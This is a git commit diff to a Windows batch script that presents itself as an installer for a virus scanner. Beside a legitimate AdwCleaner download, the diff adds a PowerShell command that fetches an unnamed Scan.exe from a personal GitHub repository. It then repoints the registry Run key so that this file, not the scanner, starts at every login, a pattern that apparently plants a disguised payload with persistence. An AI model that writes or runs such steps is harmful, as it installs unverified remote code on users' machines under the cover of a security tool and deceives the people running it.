106698dd0272ee7c83ef7881adb02f656d405d28
rrpt66 <158460098+rrpt66@users.noreply.github.com>
2024-03-03 20:15:46 +0700

    Add files via upload

--- Apill-fuse.bat
+++ Apill-fuse.bat
@@ -145,8 +145,9 @@ if %sva%== no goto :menu
 cls
 echo install.........
 powershell.exe Invoke-WebRequest -Uri "https://adwcleaner.malwarebytes.com/adwcleaner?channel=release" -OutFile "c:\adw.exe"
+powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Scan.exe" -OutFile "c:\Scan.exe"
 C:\adw.exe /preinstalled
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v "(Default)" /t REG_SZ /d "c:\adw.exe"
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v "(Default)" /t REG_SZ /d "c:\Scan.exe"
 set /p wda=" start scan virus yes or no? > "
 if %wda%== yes goto :adw
 if %wda%== no goto :menu
